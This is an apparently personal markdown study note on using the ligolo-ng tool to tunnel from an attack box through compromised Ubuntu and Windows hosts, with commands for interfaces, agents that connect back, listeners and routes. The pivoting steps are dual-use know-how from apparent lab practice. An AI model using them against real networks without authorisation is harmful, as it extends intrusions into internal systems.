[https://www.youtube.com/watch?v=de7IP_uZK6E](https://www.youtube.com/watch?v=de7IP_uZK6E) check his other vidoes

# ligolo-ng
- **Don't have 32bit agents**.
- It is binary you should transfer to the pivot.
- It doesn't need administrative privs to run.
- It create new configurations where you run it!! watch out.
- You can't use Pivoting for network packet sniff.

## Steps
### 1. in my machine, create virtual interface for ligolo “**no need to do it again**”

```sh
sudo ip tuntap add user slom mode tun ligolo  
sudo ip link set ligolo up  
```

or use
```sh
ligolo-ng » interface_create --name "evil-cha"  
INFO[3185] Creating a new "evil-cha" interface...         
INFO[3185] Interface created!

```
- `ip tuntap add`: Linux command to add a TUN/TAP device
- `user slom`: Assign ownership of the interface to the `kali` user
- `mode tun`: Create a **TUN** device (IP-level traffic, not Ethernet frames)
- `ligolo`: Name of the interface (you'll later use this in `ip link set`)
- When Ligolo-NG proxy runs, it tries to use an interface like `ligolo0` or `ligolo`, but if it doesnâ€™t exist or you lack permissions, it will fail

### 2. Start the proxy in my machine:

```sh
slom:$ ligolo -selfcert  
Listening on 0.0.0.0:11601
```

### 3. In the first pivot
```sh
pivot1:$ ./agent -connect 192.168.1.4:11601 -ignore-cert
```
   You should get connection back in slom.
```sh
INFO[1453] Agent joined.                                 id=005056946fe8 name=ubuntu@WEB01 remote="10.129.123.241:36224"  
ligolo-ng » session  
? Specify a session : 1 - ubuntu@WEB01 - 10.129.123.241:36224 - 005056946fe8  
[Agent : ubuntu@WEB01] »  
```
### 4. When get connection, we need to create a route

```sh
sudo ip route add internalUbuntuNetworkID/24 dev ligolo
```

### 5. Start the tunnel
```sh
    [Agent : ubuntu@WEB01] »  start
```

---

## For every new network it will have new virtual-interface tuntap

Now lets make the windows as our 2nd pivot
    
    sudo ip tuntap add user slom mode tun ligolo-double   
    sudo ip link set ligolo-double up  
    or  
    ligolo-ng » interface_create --name "ligolo-double"
    
    - In Ubuntu “1st pivot”, we will create listener:
    
    listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
    
    - This makes **double pivoting easier**, especially when:
        - - - - - - - You don't know in advance which interface/IP will be reachable by the next (3rd or 4th) host.
                                - You want flexibility without binding to a specific IP like `192.168.x.x`.
    - **`--addr 0.0.0.0:11601`**: Listen on _all network interfaces_ (0.0.0.0), so **any host** that can reach this machine can connect to port 11601.
    - **`--to 127.0.0.1:11601`**: Forward that traffic to `localhost:11601` on this machine (where the **second Ligolo agent** is probably connecting in the second pivot).
    - -
        
        ### - Why This Helps in Multi-hop Scenarios
        
        - - - - - - - - - - Let's say you're on:
    
    Attack box → pivot1 → pivot2 → target
    
    - You let `pivot2` connect _back_ to `pivot1:11601`, and it gets **proxied internally** to Ligolo's agent/tunnel.
    - You don’t need to mess with routing or figuring out `pivot1`'s specific internal IP — **just forward and forget**.
- In Windows, You will run `agent` to connect back to the ubuntu listener:
    
    windows> .\agent.exe -connect 10.10.8.9:11601 -ignore-cert
    
    - We will get Agent joined message.
- On our Attackbox, we should enable the tunnel and create our route
    
    ligolo*> tunnel_start --tun ligolo-double 
    
    - Create route
    
    sudo ip route add 172.16.0.0/24 dev ligolo-double